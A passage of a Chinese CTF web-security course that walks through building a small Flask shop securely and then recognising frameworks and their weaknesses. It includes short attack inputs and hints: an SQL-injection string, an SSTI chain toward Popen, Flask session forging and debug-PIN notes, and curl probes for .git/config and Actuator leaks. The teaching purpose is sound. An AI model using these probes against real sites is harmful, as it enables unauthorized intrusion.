+<div class="tablewrap"><div class="tcap">开发时会做的决定 → 后来变成的漏洞</div><table><thead><tr><th>开发时的决定</th><th>当时的理由</th><th>后来成了什么</th></tr></thead><tbody><tr><td>直接在页面里拼 SQL</td><td>快，先跑通</td><td>SQL 注入</td></tr><tr><td>前端校验金额和数量</td><td>用户体验好</td><td>逻辑漏洞、价格篡改</td></tr><tr><td>把用户 id 放在请求里</td><td>方便，模板里直接取</td><td>水平越权</td></tr><tr><td>登录后把 role 放 Cookie</td><td>省一次查库</td><td>权限伪造</td></tr><tr><td>错误信息直接返回</td><td>方便调试</td><td>信息泄露</td></tr><tr><td>上传文件不过滤后缀</td><td>先支持常见格式</td><td>文件上传 getshell</td></tr></tbody></table></div>
+<p>我们要写的小站叫 <b>wei_shop</b>，只做四件事：注册/登录、商品列表、下单、个人中心。功能很少，但六段旅程里的每一段都能碰到。</p>
+<ol class="steps"><li>先在纸上画出页面对应的四个路由和它们需要的字段。</li><li>决定每个页面的「身份从哪来」（session 里的 user_id，绝不从请求里取）。</li><li>决定「数据怎么存」（SQLite 一张 users、一张 orders）。</li><li>写完后再想：如果我是攻击者，这四处分别能怎么打？</li></ol>
+<blockquote class="note">💡 写这个站的目的不是做出一个能上线的产品，而是让你从此读别人的源码时，能一眼看到「这里本来该有校验，但他偷懒了」。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>开发视角和攻击视角为什么是同一件事的两面？</li><li>为什么「前端校验」会同时导致体验问题和安全问题？</li><li>你打算让自己的小站支持哪四个页面？</li></ol>
+</article>
+<article id="l-p3d2">
+<h2>需求与数据建模：先想清楚再写代码</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能用三张表描述一个小商城，并说清哪些字段是「敏感字段」。</p></div>
+<p>很多漏洞在写代码之前就埋下了：表设计里没有「归属」字段，后面就很容易写出越权；密码字段图省事存明文，泄露时就是灾难。</p>
+<div class="tablewrap"><div class="tcap">三张表</div><table><thead><tr><th>表</th><th>字段</th><th>注意点</th></tr></thead><tbody><tr><td>users</td><td>id, username, pass_hash, role, created_at</td><td>密码只存哈希；role 只用于服务端判断</td></tr><tr><td>products</td><td>id, name, price, stock</td><td>price 用整数（分），避免浮点误差</td></tr><tr><td>orders</td><td>id, user_id, product_id, qty, amount, status, created_at</td><td>user_id 必须来自 session；amount 由服务端算</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">建表语句（SQLite） · sql</div><pre><code>CREATE TABLE users (
+  id        INTEGER PRIMARY KEY AUTOINCREMENT,
+  username  TEXT UNIQUE NOT NULL,
+  pass_hash TEXT NOT NULL,
+  role      TEXT NOT NULL DEFAULT 'user',
+  created_at TEXT DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE TABLE products (
+  id    INTEGER PRIMARY KEY,
+  name  TEXT NOT NULL,
+  price INTEGER NOT NULL,     -- 单位：分
+  stock INTEGER NOT NULL DEFAULT 0
+);
+
+CREATE TABLE orders (
+  id         INTEGER PRIMARY KEY AUTOINCREMENT,
+  user_id    INTEGER NOT NULL,   -- 归属：谁下的单
+  product_id INTEGER NOT NULL,
+  qty        INTEGER NOT NULL,
+  amount     INTEGER NOT NULL,   -- 服务端计算，不接收前端传的金额
+  status     TEXT NOT NULL DEFAULT 'created',
+  created_at TEXT DEFAULT CURRENT_TIMESTAMP
+);</code></pre></div>
+<div class="tablewrap"><div class="tcap">哪些字段不能信</div><table><thead><tr><th>字段</th><th>为什么</th><th>正确做法</th></tr></thead><tbody><tr><td>amount</td><td>前端可以改成 1 分钱</td><td>服务端按 price × qty 重新算</td></tr><tr><td>role</td><td>用户可以改 Cookie</td><td>只从数据库读</td></tr><tr><td>user_id</td><td>可以改成别人的 id</td><td>从 session 取，不接收</td></tr><tr><td>status</td><td>可以跳过支付</td><td>状态机由服务端推进</td></tr></tbody></table></div>
+<blockquote class="note">💡 这张表的思想可以迁移到所有系统：<b>凡是「钱、身份、归属、状态」，都必须由服务端决定。</b>记住这句话，一半的逻辑漏洞就没了。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>orders 表里 user_id 为什么必须来自 session？</li><li>price 为什么用整数存「分」而不是浮点？</li><li>哪四个字段属于「服务端必须自己决定」的？</li></ol>
+</article>
+<article id="l-p3d3">
+<h2>用 Flask 写登录与页面</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>写出一个能注册、登录、看商品、下单的最小 Flask 应用，并理解 session 在这里的作用。</p></div>
+<div class="code"><div class="cbar">app.py（最小可运行） · python</div><pre><code>from flask import Flask, request, session, redirect, render_template_string
+import sqlite3, hashlib, os
+
+app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY", "dev-only-change-me")
+
+def db():
+    conn = sqlite3.connect("shop.db")
+    conn.row_factory = sqlite3.Row
+    return conn
+
+@app.route("/register", methods=["GET", "POST"])
+def register():
+    if request.method == "POST":
+        u = request.form["username"]
+        p = request.form["password"]
+        h = hashlib.sha256(p.encode()).hexdigest()
+        with db() as c:
+            c.execute("INSERT INTO users(username, pass_hash) VALUES(?, ?)", (u, h))
+        return redirect("/login")
+    return render_template_string(REG_FORM)
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        u = request.form["username"]
+        h = hashlib.sha256(request.form["password"].encode()).hexdigest()
+        row = db().execute("SELECT id, pass_hash FROM users WHERE username = ?", (u,)).fetchone()
+        if row and row["pass_hash"] == h:
+            session["uid"] = row["id"]          # 身份只放服务端签名过的 session
+            return redirect("/")
+        return "用户名或密码错误", 401
+    return render_template_string(LOGIN_FORM)
+
+@app.route("/")
+def index():
+    if "uid" not in session:
+        return redirect("/login")
+    rows = db().execute("SELECT * FROM products").fetchall()
+    return render_template_string(INDEX, rows=rows, uid=session["uid"])</code></pre></div>
+<div class="tablewrap"><div class="tcap">这一段里，哪些地方是「安全写法」</div><table><thead><tr><th>写法</th><th>为什么安全</th></tr></thead><tbody><tr><td>session["uid"] = row["id"]</td><td>身份由服务端签名，用户改不了</td></tr><tr><td>SQL 用 ? 占位符</td><td>参数化查询，杜绝注入</td></tr><tr><td>密码只存 sha256（真实项目用 bcrypt/argon2）</td><td>拖库也拿不到明文</td></tr><tr><td>secret_key 从环境变量读</td><td>不把密钥写进代码/仓库</td></tr></tbody></table></div>
+<blockquote class="note">💡 这个站还故意留了几处「不安全的写法」——比如金额从表单读、错误信息原样返回——就是为了让你在第 5 节用 Burp 亲手打自己。带着「我知道这里会出问题」的心态写代码，是理解漏洞最快的路。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://flask.palletsprojects.com/zh-cn/stable/tutorial/" target="_blank" rel="noopener">Flask 官方教程（中文）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>session 里的 uid 为什么比「请求参数里的 uid」安全？</li><li>SQL 的 ? 占位符解决了哪一类问题？</li><li>真实项目里密码哈希为什么不用裸 sha256？</li></ol>
+</article>
+<article id="l-p3d4">
+<h2>数据层：SQLite、参数化与事务</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>会用参数化查询与事务写业务逻辑，并能说出「拼接 SQL」到底错在哪。</p></div>
+<div class="code"><div class="cbar">正确 vs 错误 · python</div><pre><code># ❌ 错误：拼接字符串
+sql = f"SELECT * FROM users WHERE username = '{u}'"
+c.execute(sql)          # 传入 ' OR '1'='1 就直接绕过
+
+# ✅ 正确：参数化
+c.execute("SELECT * FROM users WHERE username = ?", (u,))
+
+# ✅ 正确：多条语句用事务，保证「扣库存 + 建订单」同时成功或同时失败
+with db() as c:
+    c.execute("UPDATE products SET stock = stock - ? WHERE id = ? AND stock &gt;= ?", (qty, pid, qty))
+    if c.total_changes == 0:
+        raise ValueError("库存不足")
+    c.execute("INSERT INTO orders(user_id, product_id, qty, amount) VALUES(?,?,?,?)",
+              (session["uid"], pid, qty, amount))</code></pre></div>
+<div class="tablewrap"><div class="tcap">数据层的三件事</div><table><thead><tr><th>事项</th><th>做法</th><th>防住了什么</th></tr></thead><tbody><tr><td>参数化</td><td>永远用 ? 占位符</td><td>SQL 注入</td></tr><tr><td>事务</td><td>扣库存与建订单放同一事务</td><td>并发下超卖/半成功</td></tr><tr><td>服务端计算</td><td>金额、库存、状态都在服务端算</td><td>价格篡改、状态跳过</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">一个容易忽略的越权写法 · python</div><pre><code># ❌ 从请求里取 user_id：用户传别人的 id 就能看别人订单
+uid = request.args.get("uid")
+orders = db().execute("SELECT * FROM orders WHERE user_id = ?", (uid,)).fetchall()
+
+# ✅ 从 session 取：只可能看到自己的
+orders = db().execute("SELECT * FROM orders WHERE user_id = ?", (session["uid"],)).fetchall()</code></pre></div>
+<blockquote class="note">💡 参数化解决「代码注入」，事务解决「并发与一致性」，服务端计算解决「信任前端」。这三条写完，你的小站就比很多线上项目安全了。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>拼接 SQL 与参数化查询在执行层面有什么不同？</li><li>为什么「扣库存 + 建订单」必须放在一个事务里？</li><li>从请求里取 user_id 会带来什么漏洞？</li></ol>
+</article>
+<article id="l-p3d5">
+<h2>上线前的安全检查清单，以及用 Burp 打自己的站</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>把自己的站跑起来，按清单自查一遍，再用 Burp 实际验证 3 个漏洞并修复。</p></div>
+<div class="tablewrap"><div class="tcap">上线前自查清单</div><table><thead><tr><th>检查项</th><th>怎么查</th><th>对应漏洞</th></tr></thead><tbody><tr><td>所有查询都参数化</td><td>全局搜 execute( / f-string 拼 SQL</td><td>SQL 注入</td></tr><tr><td>输出做了转义</td><td>搜 render_template_string / Markup</td><td>XSS</td></tr><tr><td>身份只从 session 取</td><td>搜 request.args.get("uid")</td><td>越权</td></tr><tr><td>金额/状态服务端算</td><td>搜 request.form["amount"]</td><td>逻辑漏洞</td></tr><tr><td>上传有白名单</td><td>搜 .filename / save(</td><td>文件上传</td></tr><tr><td>错误信息不回显</td><td>故意传错参数看报错</td><td>信息泄露</td></tr><tr><td>依赖没有已知漏洞</td><td>pip list → 对照 CVE</td><td>组件漏洞</td></tr></tbody></table></div>
+<ol class="steps"><li>本地跑起来：<code>flask --app app run --debug</code>，用浏览器把四个页面都走一遍。</li><li>打开 Burp，浏览器代理到 127.0.0.1:8080，勾上 Intercept。</li><li><b>打自己的站 1</b>：登录请求里把密码改成 <code>' OR '1'='1</code>，看你写的是不是参数化（应当失败）。</li><li><b>打自己的站 2</b>：下单时把 amount 改成 1，看服务端是否重新计算（应当忽略）。</li><li><b>打自己的站 3</b>：把 URL 里的订单 id 改成别人的，看是否越权（应当 403）。</li><li>发现能打通的地方，回到代码里修掉，再打一次——这一步比看十篇 WriteUp 有用。</li></ol>
+<blockquote class="note">💡 这份清单就是「正经 Web 应用开发会考虑什么」的答案：<b>输入校验、身份与权限、数据一致性、错误处理、依赖管理、部署配置</b>。它同样是你以后审计别人代码的检查表。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10</a></li><li><a href="https://portswigger.net/burp/documentation" target="_blank" rel="noopener">PortSwigger · 用 Burp 打自己的站</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>自查清单里哪一项最容易被新手忽略？</li><li>为什么「打自己的站」比看 WriteUp 更有效？</li><li>如果 amount 能被篡改成功，代码里应该改哪里？</li></ol>
+</article></section>
+<section class="mod" id="m-p4"><h1>PART 6 · 框架认知</h1><div class="sub">第 9–10 周 · 快速过 · 5 节</div><blockquote class="note">这一 PART 只花 2 周：认出技术栈、知道源码大概长什么样就够了。框架细节等遇到具体题目再回来查。</blockquote><article id="l-p4l1">
+<h2>技术栈全景：为什么是这个顺序</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>说清这条路线每一步学什么、为什么不能跳、以及每一阶段什么时候算「可以往下走」。</p></div>
+<p>左侧「技术栈认知路线」页是完整的七阶段图。这里讲清楚顺序背后的逻辑——它不是难度排名，而是<b>认知依赖</b>：后一个阶段要拿前一个阶段当工具。</p>
+<div class="tablewrap"><div class="tcap">七阶段与验收标准</div><table><thead><tr><th>阶段</th><th>内容</th><th>验收（做不到就别往下走）</th></tr></thead><tbody><tr><td>S1 JS / 前端基础</td><td>HTML/CSS/JS、DOM、Console、DevTools</td><td>能在控制台改页面、读出隐藏变量</td></tr><tr><td>S2 PHP 基础与特性</td><td>语法、超全局变量、危险函数、弱类型</td><td>看到一段 PHP 能指出「输入从哪进来、进了哪个函数」</td></tr><tr><td>S3 PHP 框架</td><td>ThinkPHP/Laravel 的路由、模板、ORM</td><td>能定位入口、猜出路由、判断版本区间</td></tr><tr><td>S4 Python 工具</td><td>requests、编码、并发、脚本化</td><td>20 行内复现一次手工测试</td></tr><tr><td>S5 Python 框架</td><td>Flask/Django、Jinja2、Werkzeug</td><td>能写带表单的小站，并自己构造一次 SSTI</td></tr><tr><td>S6 Java / Spring</td><td>反序列化、Actuator、SpEL</td><td>能看懂一段链的调用路径，说出触发点</td></tr><tr><td>S7 Node.js</td><td>Express、原型链、沙箱</td><td>能解释 Object.prototype 被污染后为什么影响全局</td></tr></tbody></table></div>
+<h3>为什么不能跳</h3>
+<ul><li><b>JS 第一</b>：你所有观测都发生在浏览器里。看不懂 JS，连「这题页面在干嘛」都判断不了。</li><li><b>PHP 特性必须早于 PHP 框架</b>：框架漏洞的表现形式（参数绑定、反序列化）都建立在弱类型与魔术方法之上。</li><li><b>Python 是工具，不是被攻击对象</b>：它可以在任何阶段并行学，但越早学会越省时间——从 PART 4 开始你就需要它了。</li><li><b>Java / Node 最后</b>：它们的漏洞形态（反序列化链、原型链污染）需要前面全部基础，提前学只会背 payload。</li></ul>
+<h3>怎么用这条路线</h3>
+<ol class="steps"><li>先看自己现在在第几阶段：能过验收标准的，直接跳到下一阶段。</li><li>把当前阶段的「验收标准」抄进笔记，作为这一阶段的学习目标。</li><li>每完成一个 PART，回来对照一次——发现自己退步了就把上一阶段补回来。</li><li>标「可选」的阶段（S3、S6、S7）第一轮可以先跳过：CTF 新手题里它们出现频率低于 S1/S2/S5。</li></ol>
+<blockquote class="note">💡 顺序是「认知依赖」，不是「学习难度排名」。你可以并行学 Python（它是工具），但 PHP 特性必须在学 PHP 框架之前——否则你只是记住了框架漏洞的名字。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="#roadmap" target="_blank" rel="noopener">左侧「🗺 技术栈认知路线」页</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么 JS 排在第一位？</li><li>「PHP 特性」和「PHP 框架」为什么不能颠倒？</li><li>Python 在这条路线里的角色是什么？</li><li>你的当前阶段是哪一阶段？验收标准是什么？</li><li>哪几个阶段第一轮可以先跳过？</li></ol>
+</article>
+<article id="l-p4l2">
+<h2>PHP 框架：ThinkPHP 与它的考点</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>看懂 ThinkPHP 站点的目录结构、路由规则与常见漏洞位置，并能判断版本。</p></div>
+<p>ThinkPHP 是国内中小项目用得极多的 PHP 框架，也是国内 CTF 的常客。框架题的难度不在「挖洞」，而在「认出这是哪个框架、哪个版本」。</p>
+<div class="tablewrap"><div class="tcap">典型目录结构</div><table><thead><tr><th>路径</th><th>作用</th><th>能泄露什么</th></tr></thead><tbody><tr><td>public/index.php</td><td>唯一入口文件</td><td>入口写法暴露版本</td></tr><tr><td>app/controller/</td><td>控制器：处理请求</td><td>业务逻辑、SQL 拼接、参数使用</td></tr><tr><td>app/model/</td><td>数据模型</td><td>表结构、字段名</td></tr><tr><td>app/view/</td><td>模板</td><td>渲染方式（是否可注入）</td></tr><tr><td>config/</td><td>配置</td><td>数据库账号、密钥（若可读）</td></tr><tr><td>runtime/</td><td>运行时缓存与日志</td><td>日志泄露、缓存文件</td></tr><tr><td>vendor/</td><td>Composer 依赖</td><td>框架版本、第三方库版本</td></tr><tr><td>composer.json</td><td>依赖清单</td><td>精确版本号</td></tr></tbody></table></div>
+<div class="tablewrap"><div class="tcap">路由长什么样</div><table><thead><tr><th>写法</th><th>含义</th><th>考点</th></tr></thead><tbody><tr><td>/index.php/index/index/index</td><td>模块/控制器/方法</td><td>默认路由，可猜</td></tr><tr><td>/index.php/index/hello?name=wei</td><td>控制器 hello 方法</td><td>参数直接映射到方法参数</td></tr><tr><td>/index.php?s=/index/index</td><td>兼容模式（s 参数）</td><td>参数覆盖风险</td></tr><tr><td>/index.php/index/index/index/name/wei</td><td>路径式传参</td><td>多版本写法差异</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">控制器里常见的危险写法 · php</div><pre><code>&lt;?php
+namespace appindexcontroller;
+
+class Index {
+    public function index($name = '') {
+        // 危险 1：直接把参数拼进 SQL
+        $sql = "select * from user where name = '$name'";
+        Db::query($sql);
+
+        // 危险 2：参数被当成模板源码渲染（SSTI）
+        return $this-&gt;fetch($name);
+
+        // 危险 3：参数进了 file_get_contents（SSRF / 文件读取）
+        return file_get_contents(input('url'));
+    }
+}
+?&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">常见版本与漏洞家族</div><table><thead><tr><th>版本</th><th>代表漏洞</th><th>怎么确认</th></tr></thead><tbody><tr><td>5.0.x</td><td>RCE（多处参数注入 -> 命令执行）</td><td>报错页样式、入口文件写法</td></tr><tr><td>5.1.x</td><td>RCE、反序列化</td><td>vendor 目录、composer.lock</td></tr><tr><td>6.x</td><td>相对少见，注意多应用模式与路由</td><td>README/错误页版本号</td></tr><tr><td>Laravel</td><td>调试模式泄露、反序列化链</td><td>X-Powered-By、报错页</td></tr></tbody></table></div>
+<h3>怎么判断版本</h3>
+<ol class="steps"><li>访问 <code>/index.php</code> 故意传错参数，看报错页样式（不同版本差异明显）。</li><li>试读 <code>/composer.json</code>、<code>/vendor/composer/installed.json</code>、<code>/composer.lock</code>。</li><li>看静态资源路径里的版本号、README/LICENSE 文件。</li><li>看入口文件的写法：5.0 与 5.1 的 bootstrap 写法不同。</li><li>确认版本后，直接去搜「ThinkPHP 5.0.x RCE」对应的公开 payload。</li></ol>
+<blockquote class="note">💡 框架漏洞的价值在于「一个版本号 → 一个已知利用链」。所以信息收集阶段，<b>版本识别比漏洞挖掘更重要</b>——国内比赛里大量框架题就是考这个。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://doc.thinkphp.cn/" target="_blank" rel="noopener">ThinkPHP 官方文档</a></li><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub · ThinkPHP 专项</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>ThinkPHP 的入口文件在哪？</li><li>怎么判断一个站用的是哪个 ThinkPHP 版本？</li><li>为什么「版本识别」比「自己挖洞」更高效？</li><li>控制器里哪三类写法最危险？</li><li>vendor 目录为什么值得优先看？</li></ol>
+</article>
+<article id="l-p4l3">
+<h2>Python / Flask：读源码与 SSTI 的根源</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>看懂一个 Flask 应用，理解模板渲染为什么会产生 SSTI，并知道 Flask 的四个常见配置风险。</p></div>
+<p>Flask 是 CTF 里最常见的 Python 后端。它代码量小、结构清晰，所以几乎每道 Flask 题都可以「读源码做题」。</p>
+<div class="code"><div class="cbar">一个最小 Flask 应用 · python</div><pre><code>from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    name = request.args.get("name", "world")
+    return render_template_string("Hello, " + name)      # ← 危险！
+
+    # 安全写法：把用户输入当变量，而不是模板源码
+    # return render_template_string("Hello, {{ name }}", name=name)
+
+if __name__ == "__main__":
+    app.run(debug=True)</code></pre></div>
+<p>关键就在那个「危险」：<b>把用户输入拼进模板字符串，再交给 Jinja2 渲染</b>，等于让用户写模板代码。模板引擎会把 <code>{{ ... }}</code> 求值，所以输入 <code>{{7*7}}</code> 会输出 49。</p>
+<div class="code"><div class="cbar">SSTI 的最小验证与利用思路 · python</div><pre><code># 请求：/?name={{7*7}}
+# 返回 Hello, 49   -&gt; 模板被执行了，存在 SSTI
+# 返回 Hello, {{7*7}} -&gt; 只是字符串
+
+# 确认后往下走：看配置、找能执行命令的类
+# {{ config }}
+# {{ ''.__class__.__mro__[1].__subclasses__() }}
+# 在子类列表里找 Popen 等危险类，再调用</code></pre></div>
+<div class="tablewrap"><div class="tcap">Flask 的四个常见配置风险</div><table><thead><tr><th>配置</th><th>风险</th><th>怎么发现</th></tr></thead><tbody><tr><td>debug=True</td><td>Werkzeug 调试器可执行任意代码</td><td>报错页出现调试器 / PIN 输入框</td></tr><tr><td>SECRET_KEY 弱/泄露</td><td>可伪造 session（Flask 的 session 是签名 cookie）</td><td>读源码拿到 key，用 flask-unsign 伪造</td></tr><tr><td>render_template_string 拼接</td><td>SSTI</td><td>输入 {{7*7}} 看是否求值</td></tr><tr><td>debug 页的 PIN</td><td>可按算法算出 PIN 进调试器</td><td>拿到 /sys/class/... 等文件即可算 PIN</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">读 Flask 源码的顺序 · python</div><pre><code># 1. 找所有路由
+@app.route("/xxx", methods=["GET", "POST"])
+# 2. 看每个路由的参数怎么被使用
+request.args.get() / request.form.get() / request.json
+# 3. 看三件事：
+#    - 有没有拼进模板（SSTI）
+#    - 有没有拼进命令/文件路径（命令执行/文件读取）
+#    - 有没有校验（登录、角色、签名）
+# 4. 看全局配置：app.config、SECRET_KEY、debug 开关</code></pre></div>
+<blockquote class="note">💡 Flask 的 session 是「客户端 cookie + 服务端签名」，不是服务端存储。<b>拿到 SECRET_KEY 就能伪造任意 session</b>——这类题比 SSTI 还常见。记住常用工具：flask-unsign。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://flask.palletsprojects.com/" target="_blank" rel="noopener">Flask 官方文档</a></li><li><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">PortSwigger · SSTI</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>render_template_string 和 render_template 的安全差异在哪？</li><li>怎么用一行请求判断有没有 SSTI？</li><li>Flask debug 模式为什么危险？</li><li>拿到 SECRET_KEY 能做什么？</li><li>读 Flask 源码时先看哪三件事？</li></ol>
+</article>
+<article id="l-p4l4">
+<h2>Django / Java Spring / Node.js 概览</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>知道这三类技术栈各自的「考点地形」，遇到时知道往哪看、怎么确认。</p></div>
+<p>这三者不需要一开始就精通，但必须知道它们的典型漏洞形态。目标是：<b>看到站的指纹，就能立刻缩小到对应的漏洞集合</b>。</p>
+<div class="tablewrap"><div class="tcap">Django（Python）</div><table><thead><tr><th>项目</th><th>内容</th></tr></thead><tbody><tr><td>结构</td><td>MTV：Model / Template / View，app 分模块</td></tr><tr><td>默认安全</td><td>模板自动转义（XSS 少见）、CSRF 默认开启</td></tr><tr><td>考点</td><td>SECRET_KEY 泄露 → session 伪造；DEBUG=True 报错泄露；pickle 反序列化；SQL 注入（少）</td></tr><tr><td>怎么确认</td><td>错误页 Django 风格、Cookie 名 csrftoken/sessionid、路径 /admin/</td></tr></tbody></table></div>
+<div class="tablewrap"><div class="tcap">Spring Boot（Java）</div><table><thead><tr><th>项目</th><th>内容</th></tr></thead><tbody><tr><td>结构</td><td>Controller / Service / Repository，注解驱动</td></tr><tr><td>指纹</td><td>Whitelabel Error Page、JSESSIONID、actuator</td></tr><tr><td>考点</td><td>Actuator 端点暴露（/actuator/env、/heapdump）、SpEL 注入、路由后缀绕过、反序列化链、Shiro/Fastjson/Log4j</td></tr><tr><td>怎么确认</td><td>报错页、Cookie 名、/actuator 探测、静态资源路径</td></tr></tbody></table></div>
+<div class="tablewrap"><div class="tcap">Node.js / Express（JS）</div><table><thead><tr><th>项目</th><th>内容</th></tr></thead><tbody><tr><td>结构</td><td>路由 + 中间件，app.use / app.get 链式</td></tr><tr><td>指纹</td><td>X-Powered-By: Express、connect.sid Cookie</td></tr><tr><td>考点</td><td>原型链污染、沙箱逃逸（vm 不是安全边界）、路径/大小写处理差异、EJS/Pug 模板注入</td></tr><tr><td>怎么确认</td><td>响应头、错误栈里的 node_modules 路径</td></tr></tbody></table></div>
+<blockquote class="note">💡 一句话记忆：<b>看到 Java 先想组件版本，看到 Node 先想原型链，看到 Python 先想模板与调试模式</b>。三者共同的起点仍然是：读源码、认版本、找入口。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html" target="_blank" rel="noopener">Spring Boot Actuator 文档</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>Spring 的 Actuator 暴露会泄露什么？</li><li>Node 的原型链污染为什么影响面这么大？</li><li>Django 默认对 XSS 的处理是什么？</li><li>白标错误页（Whitelabel Error Page）是哪类框架的特征？</li><li>三类栈各有一个「优先想」的漏洞，分别是什么？</li></ol>
+</article>
+<article id="l-p4l5">
+<h2>如何快速识别一个站的技术栈</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>用 5 个信号在两分钟内判断后端语言与框架，并能写出对应的探测命令。</p></div>
+<p>技术栈识别不是炫技，而是「把题目面积从无限缩小到一个已知的漏洞集合」。CTF 里这一步做对，后面往往就是套 payload；做错，就会反复试错浪费时间。</p>
+<div class="tablewrap"><div class="tcap">五个信号</div><table><thead><tr><th>信号</th><th>怎么查</th><th>能看出什么</th></tr></thead><tbody><tr><td>URL 后缀</td><td>看路径</td><td>.php → PHP；.jsp/.do/.action → Java；.aspx → .NET；无后缀 → 框架路由</td></tr><tr><td>响应头</td><td>curl -I</td><td>Server、X-Powered-By（ThinkPHP 会暴露）、Set-Cookie 名</td></tr><tr><td>报错页</td><td>故意传错参数</td><td>ThinkPHP 紫色页 / Flask Werkzeug 调试页 / Spring 白标页</td></tr><tr><td>Cookie 名</td><td>看 Set-Cookie</td><td>PHPSESSID=PHP、JSESSIONID=Java、connect.sid=Express、csrftoken=Django</td></tr><tr><td>静态资源路径</td><td>看源码里的 link/script</td><td>/static/、/assets/、/public/ 的组织方式各框架不同</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">两个命令先看头 · bash</div><pre><code>curl -I https://target.com/                 # 响应头指纹
+curl -s https://target.com/ | head -50      # 源码头部
+
+# 针对性探测
+curl -I https://target.com/actuator/health  # Spring Actuator
+curl -s https://target.com/.git/config      # 源码泄露
+curl -s https://target.com/robots.txt</code></pre></div>
+<h3>两分钟识别流程</h3>
+<ol class="steps"><li>敲 <code>curl -I</code> 看 Server / X-Powered-By / Set-Cookie。</li><li>打开首页看 URL 后缀和静态资源路径。</li><li>随便传个错参数（如 <code>?id='</code>），看报错页样式。</li><li>用上面的对照表得出结论；结论不确定就估一个「最可能」，后面按这个方向试。</li><li>把结论写进笔记：语言、框架、版本迹象、下一步该看哪一节。</li></ol>
+<blockquote class="note">💡 真实站点还有 WAF/CDN，头信息可能被改。所以「识别」是一个<b>概率判断</b>：用多个信号投票，而不是信一个。CTF 题目里改头信息的情况少，报告头通常可信。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://www.wappalyzer.com/" target="_blank" rel="noopener">Wappalyzer（技术栈识别扩展）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>看到 PHPSESSID 能推断出什么？</li><li>Whitelabel Error Page 是哪类框架的典型报错？</li><li>为什么「干净路径（无后缀）」反而暗示用了框架？</li><li>JSESSIONID 属于哪种语言？</li><li>识别出技术栈之后，下一步是什么？</li></ol>
+</article></section>
+<section class="mod" id="m-p5"><h1>PART 7 · 漏洞体系</h1><div class="sub">第 10–15 周 · 9 节</div><blockquote class="note">18 类漏洞。每节按「原理 → 判断 → 最小复现 → 修复」写，全部要学；细节和变体去 HackTricks / seccmd 查（方法见 p6l5）。</blockquote><article id="l-p5l1">
+<h2>漏洞全景与分类</h2>
+<div class="meta">约 20 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>建立一张漏洞地图：看到一个输入，就知道该翻哪一节的 payload。</p></div>
+<p>所有 Web 漏洞都长着同一张脸：<b>来自不可信来源的数据，被当成代码 / 路径 / 身份 / 请求 / 数据结构来用了。</b>区别只在「被当成什么」。记住这张表，比背 18 个名词管用。</p>
+<div class="tablewrap"><div class="tcap">按「被污染成什么」分类</div><table><thead><tr><th>被当成</th><th>代表漏洞</th><th>一句话原理</th></tr></thead><tbody><tr><td>代码</td><td>SQLi / XSS / 命令执行 / SSTI / XXE / 反序列化</td><td>数据被拼进了「会被执行」的位置</td></tr><tr><td>路径</td><td>路径穿越 / 文件包含 / 文件上传</td><td>数据决定了「读/写/执行哪个文件」</td></tr><tr><td>身份</td><td>认证绕过 / JWT 伪造 / Session 伪造 / CSRF</td><td>数据被当成了「你是谁」的凭证</td></tr><tr><td>服务端请求</td><td>SSRF</td><td>数据变成了「让服务器替你发的请求」</td></tr><tr><td>数据与流程</td><td>信息泄露 / 逻辑漏洞 / 越权</td><td>数据或流程本身就能被看到、被绕过</td></tr><tr><td>对象结构</td><td>原型链污染</td><td>数据被合并进了对象的原型链</td></tr></tbody></table></div>
+<h3>拿到一道题，先问三个问题</h3>
